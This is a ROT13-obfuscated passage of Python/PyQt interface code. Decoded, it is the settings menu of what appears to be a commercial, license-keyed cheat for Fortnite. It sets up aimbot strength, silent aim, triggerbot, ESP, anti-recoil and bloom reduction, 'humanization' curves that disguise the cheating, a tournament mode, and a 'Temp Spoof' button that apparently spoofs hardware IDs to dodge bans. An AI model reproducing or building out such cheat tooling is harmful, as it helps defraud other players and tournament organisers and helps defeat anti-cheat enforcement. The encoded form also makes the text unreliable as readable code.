            DNccyvpngvba.frgSbag(phfgbz_sbag)
       
        frys.Jrypbzr_ynory_1 = DYnory("")
        frys.Jrypbzr_ynory_2 = DYnory("")
        frys.Jrypbzr_ynory_3 = DYnory("")
        frys.Jrypbzr_ynory_4 = DYnory("")
        frys.Jrypbzr_ynory_5 = DYnory("")
        frys.Jrypbzr_ynory_6 = DYnory("")
        frys.Jrypbzr_ynory_7 = DYnory("")
        frys.vasb_ynory_3 = DYnory(s"<sbag pbybe='{frys.gurzr_urk_pbybe}'>Hfre Vasb:</sbag>", frys)

        frys.vasb_ynory_4 = DYnory(s"Lbhe Xrl: . . .")
        frys.vasb_ynory_5 = DYnory(s"Chepunfrq: . . .")
        frys.vasb_ynory_6 = DYnory(s"Rkcvel: . . .")
        frys.vasb_ynory_7 = DYnory(s"Ynfg Ybtva: . . .")

        frys.vasb_ynory_8 = DYnory(s"<sbag pbybe='{frys.gurzr_urk_pbybe}'>Ubgxrlf:</sbag>", frys)
        #frys.vasb_ynory_9 = DYnory(s"Pybfr Abeznyyl: <sbag pbybe='#q95276'>[K]</sbag>", frys)
        frys.vasb_ynory_10 = DYnory(s"Dhvpx Ba/Bss:  <sbag pbybe='{frys.gurzr_urk_pbybe}'>[S1]</sbag>", frys)
        frys.vasb_ynory_11 = DYnory(s"Pybfr:   <sbag pbybe='{frys.gurzr_urk_pbybe}'>[S2]</sbag>", frys)
        frys.vasb_ynory_13 = DYnory(s"Gbttyr Zrah:   <sbag pbybe='{frys.gurzr_urk_pbybe}'>[VAF]</sbag>", frys)

        frys.Sbi_Fvmr_ynory = DYnory(
            s"SBI: {fge(Sbi_Fvmr)}")
        frys.fyvqre = DFyvqre(Dg.Ubevmbagny)
        frys.fyvqre.frgFglyrFurrg(frys.trg_fyvqre_fglyr())
        frys.fyvqre.frgZnkvzhzJvqgu(160)
        frys.fyvqre.frgZvavzhzJvqgu(160)
        frys.fyvqre.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.fyvqre.frgZvavzhz(100)
        frys.fyvqre.frgZnkvzhz(700)
        frys.fyvqre.frgInyhr(vag(ebhaq(Sbi_Fvmr)))

        frys.Pbasvqrapr_ynory = DYnory(
            s"Pbasvqrapr: {fge(Pbasvqrapr)}%")
        frys.fyvqre0 = DFyvqre(Dg.Ubevmbagny)
        frys.fyvqre0.frgFglyrFurrg(frys.trg_fyvqre_fglyr())
        frys.fyvqre0.frgZnkvzhzJvqgu(160)
        frys.fyvqre0.frgZvavzhzJvqgu(160)
        frys.fyvqre0.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.fyvqre0.frgZvavzhz(40)
        frys.fyvqre0.frgZnkvzhz(95)
        frys.fyvqre0.frgInyhr(vag(ebhaq(Pbasvqrapr)))

        frys.Nvz_Fzbbgu_ynory = DYnory(
            s"Nvzobg Fgeratgu: {fge(Nvz_Fzbbgu)}")
        frys.fyvqre3 = DFyvqre(Dg.Ubevmbagny)
        frys.fyvqre3.frgFglyrFurrg(frys.trg_fyvqre_fglyr())
        frys.fyvqre3.frgZnkvzhzJvqgu(160)
        frys.fyvqre3.frgZvavzhzJvqgu(160)
        frys.fyvqre3.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.fyvqre3.frgZvavzhz(5)
        frys.fyvqre3.frgZnkvzhz(200)
        frys.fyvqre3.frgInyhr(vag(ebhaq(Nvz_Fzbbgu)))

        frys.Znk_Qrgrpgvbaf_ynory = DYnory(
            s"Znk Qrgrpgvbaf: {fge(Znk_Qrgrpgvbaf)}")
        frys.fyvqre4 = DFyvqre(Dg.Ubevmbagny)
        frys.fyvqre4.frgFglyrFurrg(frys.trg_fyvqre_fglyr())
        frys.fyvqre4.frgZnkvzhzJvqgu(160)
        frys.fyvqre4.frgZvavzhzJvqgu(160)
        frys.fyvqre4.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.fyvqre4.frgZvavzhz(1)
        frys.fyvqre4.frgZnkvzhz(6)
        frys.fyvqre4.frgInyhr(vag(ebhaq(Znk_Qrgrpgvbaf)))

        frys.nvz_obar_ynory = DYnory("Nvz Obar")
        frys.nvz_obar_pbzobobk = DPbzobObk()
        frys.nvz_obar_pbzobobk.frgZvavzhzUrvtug(10)
        frys.nvz_obar_pbzobobk.frgZnkvzhzUrvtug(10)
        frys.nvz_obar_pbzobobk.frgZvavzhzJvqgu(160)
        frys.nvz_obar_pbzobobk.frgZnkvzhzUrvtug(160)
        frys.nvz_obar_pbzobobk.frgFglyrFurrg("DPbzobObk { onpxtebhaq-pbybe: " + frys.jvqtrg_ot_pbybe + "; }")
        frys.nvz_obar_pbzobobk.nqqVgrzf(["Urnq", "Arpx", "Obql"])
        frys.Nvz_Obar = frys.nvz_obar_pbzobobk.pheeragGrkg()
        vs Nvz_Obar == "Urnq":
            frys.nvz_obar_pbzobobk.frgPheeragGrkg("Urnq") 
        vs Nvz_Obar == "Arpx":
            frys.nvz_obar_pbzobobk.frgPheeragGrkg("Arpx") 
        vs Nvz_Obar == "Obql":
            frys.nvz_obar_pbzobobk.frgPheeragGrkg("Obql") 

        frys.fzbbguvat_glcr_ynory = DYnory("Uhznavmngvba")
        frys.fzbbguvat_glcr_pbzobobk = DPbzobObk()
        frys.fzbbguvat_glcr_pbzobobk.frgZvavzhzUrvtug(10)
        frys.fzbbguvat_glcr_pbzobobk.frgZnkvzhzUrvtug(10)
        frys.fzbbguvat_glcr_pbzobobk.frgZvavzhzJvqgu(160)
        frys.fzbbguvat_glcr_pbzobobk.frgZnkvzhzUrvtug(160)
        frys.fzbbguvat_glcr_pbzobobk.frgFglyrFurrg("DPbzobObk { onpxtebhaq-pbybe: " + frys.jvqtrg_ot_pbybe + "; }")
        frys.fzbbguvat_glcr_pbzobobk.nqqVgrzf(["Qrsnhyg", "Ormvre", "Pngzhyy-Ebz", "Urezvgr", "O-Fcyvar", "Fvar", "Rkcbaragvny"])
        frys.Fzbbguvat_Glcr = frys.fzbbguvat_glcr_pbzobobk.pheeragGrkg()
        vs Fzbbguvat_Glcr == "Qrsnhyg":
            frys.fzbbguvat_glcr_pbzobobk.frgPheeragGrkg("Qrsnhyg") 
        vs Fzbbguvat_Glcr == "Ormvre":
            frys.fzbbguvat_glcr_pbzobobk.frgPheeragGrkg("Ormvre") 
        vs Fzbbguvat_Glcr == "Pngzhyy-Ebz":
            frys.fzbbguvat_glcr_pbzobobk.frgPheeragGrkg("Pngzhyy-Ebz")
        vs Fzbbguvat_Glcr == "Urezvgr":
            frys.fzbbguvat_glcr_pbzobobk.frgPheeragGrkg("Urezvgr") 
        vs Fzbbguvat_Glcr == "Fvar":
            frys.fzbbguvat_glcr_pbzobobk.frgPheeragGrkg("Fvar")  
        vs Fzbbguvat_Glcr == "Rkcbaragvny":
            frys.fzbbguvat_glcr_pbzobobk.frgPheeragGrkg("Rkcbaragvny")  
        frys.vzt_inyhr_ynory = DYnory("Oybo Fvmr")
        frys.vzt_inyhr_pbzobobk = DPbzobObk()
        frys.vzt_inyhr_pbzobobk.frgZvavzhzUrvtug(10)
        frys.vzt_inyhr_pbzobobk.frgZnkvzhzUrvtug(10)
        frys.vzt_inyhr_pbzobobk.frgZvavzhzJvqgu(160)
        frys.vzt_inyhr_pbzobobk.frgZnkvzhzUrvtug(160)
        frys.vzt_inyhr_pbzobobk.frgFglyrFurrg("DPbzobObk { onpxtebhaq-pbybe: " + frys.jvqtrg_ot_pbybe + "; }")
        frys.vzt_inyhr_pbzobobk.nqqVgrzf(["320", "480", "640", "736", "832"])
        frys.vzt_inyhr = frys.vzt_inyhr_pbzobobk.pheeragGrkg()
        vs Vzt_Inyhr == "320":
            frys.vzt_inyhr_pbzobobk.frgPheeragGrkg("320") 
        vs Vzt_Inyhr == "480":
            frys.vzt_inyhr_pbzobobk.frgPheeragGrkg("480") 
        vs Vzt_Inyhr == "640":
            frys.vzt_inyhr_pbzobobk.frgPheeragGrkg("640")
        vs Vzt_Inyhr == "736":
            frys.vzt_inyhr_pbzobobk.frgPheeragGrkg("736")
        vs Vzt_Inyhr == "832":
            frys.vzt_inyhr_pbzobobk.frgPheeragGrkg("832")

        frys.scf_ynory = DYnory(
            s"Znk SCF: {fge(Zbqry_SCF)}")
        frys.fyvqre_scf = DFyvqre(Dg.Ubevmbagny)
        frys.fyvqre_scf.frgFglyrFurrg(frys.trg_fyvqre_fglyr())
        frys.fyvqre_scf.frgZnkvzhzJvqgu(160)
        frys.fyvqre_scf.frgZvavzhzJvqgu(160)
        frys.fyvqre_scf.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.fyvqre_scf.frgZvavzhz(60)
        frys.fyvqre_scf.frgZnkvzhz(360)
        frys.fyvqre_scf.frgInyhr(vag(ebhaq(Zbqry_SCF)))

        # Perngr naq pbasvther gur PbzobObk
        frys.zbqry_fryrpgrq_ynory = DYnory("Ybnq Zbqry")
        frys.zbqry_fryrpgrq_pbzobobk = DPbzobObk()
        frys.zbqry_fryrpgrq_pbzobobk.frgZvavzhzUrvtug(10)
        frys.zbqry_fryrpgrq_pbzobobk.frgZnkvzhzUrvtug(10)
        frys.zbqry_fryrpgrq_pbzobobk.frgZvavzhzJvqgu(160)
        frys.zbqry_fryrpgrq_pbzobobk.frgZnkvzhzUrvtug(160)
        frys.zbqry_fryrpgrq_pbzobobk.frgFglyrFurrg("DPbzobObk { onpxtebhaq-pbybe: " + frys.jvqtrg_ot_pbybe + "; }")

        # Ybnq zbqryf naq cbchyngr gur PbzobObk
        frys.zbqryff = {}
        frys.ybnq_zbqryff()

        #frys.eto_ynory = DYnory(s"ETO: 255 50 1")
        #frys.uhr_fyvqre = DFyvqre(Dg.Ubevmbagny)
        # frys.uhr_fyvqre.frgFglyrFurrg(frys.trg_fyvqre_fglyr())
        # frys.uhr_fyvqre.frgZnkvzhzJvqgu(160)
        # frys.uhr_fyvqre.frgZvavzhzJvqgu(160)
        # frys.uhr_fyvqre.frgSbphfCbyvpl(Dg.AbSbphf)
        # frys.uhr_fyvqre.frgZvavzhz(0)
        # frys.uhr_fyvqre.frgZnkvzhz(359)
        uhre, _, _ = pbybeflf.eto_gb_ufi(151 / 255.0, 158  / 255.0, 248  / 255.0)
        uhr_qrterrff = vag(uhre * 359)
        #frys.uhr_fyvqre.frgInyhr(uhr_qrterrff)

        # frys.yvtugarff_ynory = DYnory(s"Yvtugarff: 128")
        # frys.yvtugarff_fyvqre = DFyvqre(Dg.Ubevmbagny)
        # frys.yvtugarff_fyvqre.frgFglyrFurrg(frys.trg_fyvqre_fglyr())
        # frys.yvtugarff_fyvqre.frgZnkvzhzJvqgu(160)
        # frys.yvtugarff_fyvqre.frgZvavzhzJvqgu(160)
        # frys.yvtugarff_fyvqre.frgSbphfCbyvpl(Dg.AbSbphf)
        # frys.yvtugarff_fyvqre.frgZvavzhz(0)
        # frys.yvtugarff_fyvqre.frgZnkvzhz(255)
        # frys.yvtugarff_fyvqre.frgInyhr(pbas_yvtugarff)

        # frys.bcnpvgl_ynory = DYnory(s"Bcnpvgl: 200")
        # frys.bcnpvgl_fyvqre = DFyvqre(Dg.Ubevmbagny)
        # frys.bcnpvgl_fyvqre.frgFglyrFurrg(frys.trg_fyvqre_fglyr())
        # frys.bcnpvgl_fyvqre.frgZnkvzhzJvqgu(160)
        # frys.bcnpvgl_fyvqre.frgZvavzhzJvqgu(160)
        # frys.bcnpvgl_fyvqre.frgSbphfCbyvpl(Dg.AbSbphf)
        # frys.bcnpvgl_fyvqre.frgZvavzhz(0)
        # frys.bcnpvgl_fyvqre.frgZnkvzhz(255)
        # frys.bcnpvgl_fyvqre.frgInyhr(pbas_bcnpvgl)

        frys.Ranoyr_Nvz_purpxobk = DPurpxObk("Ranoyr Nvzobg")
        frys.Ranoyr_Nvz_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.Ranoyr_Nvz_purpxobk.frgPurpxrq(Ranoyr_Nvz)

        frys.Ranoyr_Fybgf_purpxobk = DPurpxObk("Ranoyr Jrncba Fybgf")
        frys.Ranoyr_Fybgf_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.Ranoyr_Fybgf_purpxobk.frgPurpxrq(Ranoyr_Fybgf)


        frys.Ranoyr_Syvpx_purpxobk = DPurpxObk("Ranoyr Fvyrag Nvz")
        frys.Ranoyr_Syvpx_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.Ranoyr_Syvpx_purpxobk.frgPurpxrq(Ranoyr_Syvpx_Obg)


        frys.syvpx_fraf_vasb_ynory = DYnory("Hfr lbhe va-tnzr sbegavgr frafvgvivgl.")
        frys.syvpx_frg_vasb_ynory = DYnory("Fvyrag Nvz Frggvatf:")

        frys.syvpx_fpbcr_ynory = DYnory(s"Fvyrag Nvz Fgeratgu: {fge(Syvpx_Fpbcr_Fraf)}%")
        frys.syvpx_fpbcr_fyvqre = DFyvqre(Dg.Ubevmbagny)
        frys.syvpx_fpbcr_fyvqre.frgFglyrFurrg(frys.trg_fyvqre_fglyr())
        frys.syvpx_fpbcr_fyvqre.frgZnkvzhzJvqgu(160)
        frys.syvpx_fpbcr_fyvqre.frgZvavzhzJvqgu(160)
        frys.syvpx_fpbcr_fyvqre.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.syvpx_fpbcr_fyvqre.frgZvavzhz(10)
        frys.syvpx_fpbcr_fyvqre.frgZnkvzhz(90)
        frys.syvpx_fpbcr_fyvqre.frgInyhr(vag(Syvpx_Fpbcr_Fraf))

        frys.syvpx_pbby_ynory = DYnory(s"Pbby Qbja: {fge(Syvpx_Pbbyqbja)}f")
        frys.syvpx_pbby_fyvqre = DFyvqre(Dg.Ubevmbagny)
        frys.syvpx_pbby_fyvqre.frgFglyrFurrg(frys.trg_fyvqre_fglyr())
        frys.syvpx_pbby_fyvqre.frgZnkvzhzJvqgu(160)
        frys.syvpx_pbby_fyvqre.frgZvavzhzJvqgu(160)
        frys.syvpx_pbby_fyvqre.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.syvpx_pbby_fyvqre.frgZvavzhz(5)
        frys.syvpx_pbby_fyvqre.frgZnkvzhz(120)
        frys.syvpx_pbby_fyvqre.frgInyhr(vag(Syvpx_Pbbyqbja * 100))

        frys.syvpx_qrynl_ynory = DYnory(s"Fubg Qrynl: {fge(Syvpx_Qrynl)}f")
        frys.syvpx_qrynl_fyvqre = DFyvqre(Dg.Ubevmbagny)
        frys.syvpx_qrynl_fyvqre.frgFglyrFurrg(frys.trg_fyvqre_fglyr())
        frys.syvpx_qrynl_fyvqre.frgZnkvzhzJvqgu(160)
        frys.syvpx_qrynl_fyvqre.frgZvavzhzJvqgu(160)
        frys.syvpx_qrynl_fyvqre.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.syvpx_qrynl_fyvqre.frgZvavzhz(3)
        frys.syvpx_qrynl_fyvqre.frgZnkvzhz(10)
        frys.syvpx_qrynl_fyvqre.frgInyhr(vag(Syvpx_Qrynl * 1000))


        frys.Pbagebyyre_Ba_purpxobk = DPurpxObk("Pbagebyyre Fhccbeg [orgn]")
        frys.Pbagebyyre_Ba_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.Pbagebyyre_Ba_purpxobk.frgPurpxrq(Pbagebyyre_Ba)

        frys.PhcZbqr_Ba_purpxobk = DPurpxObk("Ranoyr Gbheanzrag Zbqr")
        frys.PhcZbqr_Ba_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.PhcZbqr_Ba_purpxobk.frgPurpxrq(PhcZbqr_Ba)

        frys.NagvErpbvy_Ba_purpxobk = DPurpxObk("Ranoyr Nagv-Erpbvy")
        frys.NagvErpbvy_Ba_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.NagvErpbvy_Ba_purpxobk.frgPurpxrq(NagvErpbvy_Ba)

        frys.Erqhpr_Oybbz_purpxobk = DPurpxObk("Erqhpr Oybbz")
        frys.Erqhpr_Oybbz_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.Erqhpr_Oybbz_purpxobk.frgPurpxrq(Erqhpr_Oybbz)

        frys.Erdhver_NQF_purpxobk = DPurpxObk("Erdhver NQF")
        frys.Erdhver_NQF_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.Erdhver_NQF_purpxobk.frgPurpxrq(Erdhver_NQF)

        frys.NagvErpbvy_Fgeratgu_ynory = DYnory(
            s"Fgeratgu: {fge(NagvErpbvy_Fgeratgu)}")
        frys.fyvqre60 = DFyvqre(Dg.Ubevmbagny)

        frys.fyvqre60.frgFglyrFurrg(frys.trg_fyvqre_fglyr())
        frys.fyvqre60.frgZnkvzhzJvqgu(160)
        frys.fyvqre60.frgZvavzhzJvqgu(160)

        frys.fyvqre60.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.fyvqre60.frgZvavzhz(1)
        frys.fyvqre60.frgZnkvzhz(10)
        frys.fyvqre60.frgInyhr(vag(ebhaq(NagvErpbvy_Fgeratgu)))

        #Nhgb_Sver_Sbi_Fvmr

        frys.Fubj_Sbi_purpxobk = DPurpxObk("SBI")
        frys.Fubj_Sbi_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.Fubj_Sbi_purpxobk.frgPurpxrq(Fubj_Sbi)
        frys.Fubj_Pebffunve_purpxobk = DPurpxObk("Pebffunve")
        frys.Fubj_Pebffunve_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.Fubj_Pebffunve_purpxobk.frgPurpxrq(Fubj_Pebffunve)
        frys.Fubj_Qrgrpgvbaf_purpxobk = DPurpxObk("RFC")
        frys.Fubj_Qrgrpgvbaf_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.Fubj_Qrgrpgvbaf_purpxobk.frgPurpxrq(Fubj_Qrgrpgvbaf)

        frys.Fubj_Nvzyvar_purpxobk = DPurpxObk("Nvzyvar")
        frys.Fubj_Nvzyvar_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.Fubj_Nvzyvar_purpxobk.frgPurpxrq(Fubj_Nvzyvar)

        frys.Fubj_Qroht_purpxobk = DPurpxObk("Qroht")
        frys.Fubj_Qroht_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.Fubj_Qroht_purpxobk.frgPurpxrq(Fubj_Qroht)

        frys.Fubj_SCF_purpxobk = DPurpxObk("Fubj Vasb One")
        frys.Fubj_SCF_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.Fubj_SCF_purpxobk.frgPurpxrq(Fubj_SCF)

        frys.Fubj_PZQ_purpxobk = DPurpxObk("Fubj PZQ")
        frys.Fubj_PZQ_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.Fubj_PZQ_purpxobk.frgPurpxrq(Snyfr)

        frys.Ranoyr_GevttreObg_purpxobk = DPurpxObk("Ranoyr Gevttreobg")
        frys.Ranoyr_GevttreObg_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.Ranoyr_GevttreObg_purpxobk.frgPurpxrq(Ranoyr_GevttreObg)

        frys.Hfr_Zbqry_Pynff_purpxobk = DPurpxObk("Qrgrpg Fvatyr Pynff Bayl")
        frys.Hfr_Zbqry_Pynff_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.Hfr_Zbqry_Pynff_purpxobk.frgPurpxrq(Hfr_Zbqry_Pynff)

        frys.Erdhver_Xrlovaq_purpxobk = DPurpxObk("Hfr Xrlovaq sbe Gevttreobg")
        frys.Erdhver_Xrlovaq_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.Erdhver_Xrlovaq_purpxobk.frgPurpxrq(Erdhver_Xrlovaq)
        frys.Hfr_Uhr_purpxobk = DPurpxObk("Envaobj Ivfhnyf")
        frys.Hfr_Uhr_purpxobk.frgQvfnoyrq(Snyfr)
        frys.Hfr_Uhr_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.Hfr_Uhr_purpxobk.frgPurpxrq(Hfr_Uhr)
        # frys.Fgernzcebbs_purpxobk = DPurpxObk("Fgernzcebbs")
        # frys.Fgernzcebbs_purpxobk.frgQvfnoyrq(Snyfr)
        # frys.Fgernzcebbs_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        # frys.Fgernzcebbs_purpxobk.frgPurpxrq(Fgernzcebbs)

        frys.Nhgb_Sver_Sbi_Fvmr_ynory = DYnory(
            s"SBI Fvmr: {fge(Nhgb_Sver_Sbi_Fvmr)}")
        frys.fyvqre5 = DFyvqre(Dg.Ubevmbagny)
        frys.fyvqre5.frgFglyrFurrg(frys.trg_fyvqre_fglyr())
        frys.fyvqre5.frgZnkvzhzJvqgu(160)
        frys.fyvqre5.frgZvavzhzJvqgu(160)
        frys.fyvqre5.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.fyvqre5.frgZvavzhz(4)
        frys.fyvqre5.frgZnkvzhz(30)
        frys.fyvqre5.frgInyhr(vag(ebhaq(Nhgb_Sver_Sbi_Fvmr)))

        frys.obk_glcr_ynory = DYnory("Obk Glcr")
        frys.obk_glcr_pbzobobk = DPbzobObk()
        frys.obk_glcr_pbzobobk.frgZvavzhzUrvtug(10)
        frys.obk_glcr_pbzobobk.frgZnkvzhzUrvtug(10)
        frys.obk_glcr_pbzobobk.frgZvavzhzJvqgu(160)
        frys.obk_glcr_pbzobobk.frgZnkvzhzUrvtug(160)
        frys.obk_glcr_pbzobobk.frgFglyrFurrg("DPbzobObk { onpxtebhaq-pbybe: " + frys.jvqtrg_ot_pbybe + "; }")
        frys.obk_glcr_pbzobobk.nqqVgrzf(["Erthyne", "Pbeare", "Svyyrq"])
        frys.Obk_glcr = frys.obk_glcr_pbzobobk.pheeragGrkg()
        vs Obk_glcr == "Erthyne":
            frys.obk_glcr_pbzobobk.frgPheeragGrkg("Erthyne") 
        vs Obk_glcr == "Pbeare":
            frys.obk_glcr_pbzobobk.frgPheeragGrkg("Pbeare") 
        vs Obk_glcr == "Svyyrq":
            frys.obk_glcr_pbzobobk.frgPheeragGrkg("Svyyrq") 
        frys.Nhgb_Sver_Pbasvqrapr_ynory = DYnory(
            s"Pbasvqrapr: {fge(Nhgb_Sver_Pbasvqrapr)}%")
        frys.fyvqre6 = DFyvqre(Dg.Ubevmbagny)
        frys.fyvqre6.frgFglyrFurrg(frys.trg_fyvqre_fglyr())
        frys.fyvqre6.frgZnkvzhzJvqgu(160)
        frys.fyvqre6.frgZvavzhzJvqgu(160)
        frys.fyvqre6.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.fyvqre6.frgZvavzhz(60)
        frys.fyvqre6.frgZnkvzhz(100)
        frys.fyvqre6.frgInyhr(vag(ebhaq(Nhgb_Sver_Pbasvqrapr)))

        frys.oga_rkgenvav = DChfuOhggba("Erserfu")
        frys.oga_rkgenvav.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.oga_rkgenvav.frgFglyrFurrg(frys.trg_ohggba_fglyr())
        frys.oga_rkgenvav.frgZvavzhzJvqgu(120)
        frys.oga_rkgenvav.pyvpxrq.pbaarpg(frys.erserfu_rkgen)

        frys.oga_rkgenvav2 = DChfuOhggba("Erserfu")
        frys.oga_rkgenvav2.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.oga_rkgenvav2.frgFglyrFurrg(frys.trg_ohggba_fglyr())
        frys.oga_rkgenvav2.frgZvavzhzJvqgu(80)
        frys.oga_rkgenvav2.pyvpxrq.pbaarpg(frys.erserfu_rkgen)

        frys.grzcfcbbs_ohggba = DChfuOhggba("Grzc Fcbbs")
        frys.grzcfcbbs_ohggba.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.grzcfcbbs_ohggba.frgFglyrFurrg(frys.trg_ohggba_fglyr())
        frys.grzcfcbbs_ohggba.frgZvavzhzJvqgu(80)
        frys.grzcfcbbs_ohggba.frgZvavzhzUrvtug(25)
        frys.grzcfcbbs_ohggba.pyvpxrq.pbaarpg(frys.grzc_fcbbs)

        frys.ubgxrl_ynory = DYnory(s"Xrlovaqf: ")
        frys.ubgxrl_ynory2 = DYnory("")
        xrl_anzr_pbairegrq = XRL_ANZRF.trg(Xrlovaq, s"0k{Xrlovaq:02K}")
        xrl_anzr_pbairegrq2 = XRL_ANZRF.trg(Xrlovaq2, s"0k{Xrlovaq2:02K}")
        xrl_anzr_pbairegrq3 = XRL_ANZRF.trg(Nhgb_Sver_Xrlovaq, s"0k{Nhgb_Sver_Xrlovaq:02K}")
        xrl_anzr_pbairegrq4 = XRL_ANZRF.trg(Syvpxobg_Xrlovaq, s"0k{Syvpxobg_Xrlovaq:02K}")
        vf_fryrpgvat_ubgxrl = Snyfr
        frys.oga_ubgxrl = DChfuOhggba(s"{xrl_anzr_pbairegrq}")
        frys.oga_ubgxrl.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.oga_ubgxrl.frgFglyrFurrg(frys.trg_ohggba_fglyr())
        frys.oga_ubgxrl.frgZvavzhzJvqgu(80)
        frys.oga_ubgxrl.pyvpxrq.pbaarpg(frys.fgneg_fryrpg_ubgxrl)

        vf_fryrpgvat_ubgxrl2 = Snyfr
        frys.oga_ubgxrl2 = DChfuOhggba(s"{xrl_anzr_pbairegrq2}")
        frys.oga_ubgxrl2.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.oga_ubgxrl2.frgFglyrFurrg(frys.trg_ohggba_fglyr())
        frys.oga_ubgxrl2.frgZvavzhzJvqgu(80)
        frys.oga_ubgxrl2.pyvpxrq.pbaarpg(frys.fgneg_fryrpg_ubgxrl2)

        frys.ubgxrl_ynory3 = DYnory("Gevttreobg Xrl")
        vf_fryrpgvat_ubgxrl3 = Snyfr
        frys.oga_ubgxrl3 = DChfuOhggba(s"{xrl_anzr_pbairegrq3}")
        frys.oga_ubgxrl3.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.oga_ubgxrl3.frgFglyrFurrg(frys.trg_ohggba_fglyr())
        frys.oga_ubgxrl3.frgZvavzhzJvqgu(80)
        frys.oga_ubgxrl3.pyvpxrq.pbaarpg(frys.fgneg_fryrpg_ubgxrl3)

        frys.ubgxrl_ynory4 = DYnory("Xrlovaq: ")
        vf_fryrpgvat_ubgxrl4 = Snyfr
        frys.oga_ubgxrl4 = DChfuOhggba(s"{xrl_anzr_pbairegrq4}")
        frys.oga_ubgxrl4.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.oga_ubgxrl4.frgFglyrFurrg(frys.trg_ohggba_fglyr())
        frys.oga_ubgxrl4.frgZvavzhzJvqgu(80)
        frys.oga_ubgxrl4.pyvpxrq.pbaarpg(frys.fgneg_fryrpg_ubgxrl4)

# Fybgf Fgneg
        frys.Ranoyr_Nvz_Fybg1_purpxobk = DPurpxObk("Nvz")
        frys.Ranoyr_Nvz_Fybg1_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.Ranoyr_Nvz_Fybg1_purpxobk.frgPurpxrq(Ranoyr_Nvz_Fybg1)

        frys.Ranoyr_Nvz_Fybg2_purpxobk = DPurpxObk("Nvz")
        frys.Ranoyr_Nvz_Fybg2_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.Ranoyr_Nvz_Fybg2_purpxobk.frgPurpxrq(Ranoyr_Nvz_Fybg2)

        frys.Ranoyr_Nvz_Fybg3_purpxobk = DPurpxObk("Nvz")
        frys.Ranoyr_Nvz_Fybg3_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.Ranoyr_Nvz_Fybg3_purpxobk.frgPurpxrq(Ranoyr_Nvz_Fybg3)

        frys.Ranoyr_Nvz_Fybg4_purpxobk = DPurpxObk("Nvz")
        frys.Ranoyr_Nvz_Fybg4_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.Ranoyr_Nvz_Fybg4_purpxobk.frgPurpxrq(Ranoyr_Nvz_Fybg4)

        frys.Ranoyr_Nvz_Fybg5_purpxobk = DPurpxObk("Nvz")
        frys.Ranoyr_Nvz_Fybg5_purpxobk.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.Ranoyr_Nvz_Fybg5_purpxobk.frgPurpxrq(Ranoyr_Nvz_Fybg5)

        frys.Sbi_Fvmr_ynory_fybg1 = DYnory(s"SBI: {fge(Sbi_Fvmr_Fybg1)}")
        frys.fyvqre_fybg1 = DFyvqre(Dg.Ubevmbagny)
        frys.fyvqre_fybg1.frgFglyrFurrg(frys.trg_fyvqre_fglyr())
        frys.fyvqre_fybg1.frgZnkvzhzJvqgu(80)
        frys.fyvqre_fybg1.frgZvavzhzJvqgu(80)
        frys.fyvqre_fybg1.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.fyvqre_fybg1.frgZvavzhz(120)
        frys.fyvqre_fybg1.frgZnkvzhz(800)
        frys.fyvqre_fybg1.frgInyhr(vag(ebhaq(Sbi_Fvmr_Fybg1)))

        frys.Sbi_Fvmr_ynory_fybg2 = DYnory(s"SBI: {fge(Sbi_Fvmr_Fybg2)}")
        frys.fyvqre_fybg2 = DFyvqre(Dg.Ubevmbagny)
        frys.fyvqre_fybg2.frgFglyrFurrg(frys.trg_fyvqre_fglyr())
        frys.fyvqre_fybg2.frgZnkvzhzJvqgu(80)
        frys.fyvqre_fybg2.frgZvavzhzJvqgu(80)
        frys.fyvqre_fybg2.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.fyvqre_fybg2.frgZvavzhz(120)
        frys.fyvqre_fybg2.frgZnkvzhz(800)
        frys.fyvqre_fybg2.frgInyhr(vag(ebhaq(Sbi_Fvmr_Fybg2)))

        frys.Sbi_Fvmr_ynory_fybg3 = DYnory(s"SBI: {fge(Sbi_Fvmr_Fybg3)}")
        frys.fyvqre_fybg3 = DFyvqre(Dg.Ubevmbagny)
